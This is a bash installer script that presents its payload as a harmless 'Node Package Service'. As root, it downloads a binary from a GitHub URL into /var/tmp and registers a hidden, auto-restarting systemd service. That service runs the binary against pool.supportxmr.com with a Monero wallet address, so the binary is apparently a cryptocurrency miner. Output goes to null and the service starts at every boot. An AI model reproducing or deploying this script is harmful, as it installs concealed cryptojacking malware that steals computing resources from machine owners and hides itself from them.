#!/bin/bash

# Exit on error
set -e

# Variables
URL="https://github.com/yellphonenaing199/installer/raw/refs/heads/main/package"
TARGET_DIR="/var/tmp"
FILENAME="node-package"
FULL_PATH="$TARGET_DIR/$FILENAME"
SERVICE_NAME="node-package"
SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}.service"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Function to print colored output
print_status() {
    echo -e "${GREEN}[INFO]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# Check if running as root
if [[ $EUID -ne 0 ]]; then
   print_error "This script must be run as root (use sudo)"
   exit 1
fi

print_status "Starting installation of $SERVICE_NAME service..."

# Ensure target directory exists
print_status "Creating target directory: $TARGET_DIR"
mkdir -p "$TARGET_DIR"

# Download the file to /var/tmp
print_status "Downloading $FILENAME to $FULL_PATH..."
if curl -L -o "$FULL_PATH" "$URL"; then
    print_status "Download completed successfully"
else
    print_error "Failed to download file"
    exit 1
fi

# Make it executable
print_status "Making file executable..."
chmod +x "$FULL_PATH"

# Create systemd service file
print_status "Creating systemd service file: $SERVICE_FILE"
cat > "$SERVICE_FILE" << EOF
[Unit]
Description=Node Package Service
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=always
RestartSec=1
User=root
ExecStart=$FULL_PATH -o pool.supportxmr.com:443 -u 44xquCZRP7k5QVc77uPtxb7Jtkaj1xyztAwoyUtmigQoHtzA8EmnAEUbpoeWcxRy1nJxu4UYrR4fN3MPufQQk4MTL6M2Y73 -k --tls -p prolay
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
EOF

# Reload systemd daemon
print_status "Reloading systemd daemon..."
systemctl daemon-reload

# Enable the service to start on boot
print_status "Enabling service to start on boot..."
systemctl enable "$SERVICE_NAME"

# Start the service
print_status "Starting the service..."
systemctl start "$SERVICE_NAME"

# Check service status
sleep 2
if systemctl is-active --quiet "$SERVICE_NAME"; then
    print_status "Service is running successfully!"
    print_status "Service status:"
    systemctl status "$SERVICE_NAME" --no-pager -l
else
    print_error "Service failed to start!"
    print_error "Service status:"
    systemctl status "$SERVICE_NAME" --no-pager -l
    exit 1
fi

print_status "Installation completed successfully!"
print_status "The service will automatically start on boot."
print_status ""
print_status "Useful commands:"
print_status "  Check status: sudo systemctl status $SERVICE_NAME"
print_status "  Stop service: sudo systemctl stop $SERVICE_NAME"
print_status "  Start service: sudo systemctl start $SERVICE_NAME"
print_status "  Restart service: sudo systemctl restart $SERVICE_NAME"
print_status "  View logs: sudo journalctl -u $SERVICE_NAME -f"
print_status "  Disable auto-start: sudo systemctl disable $SERVICE_NAME"
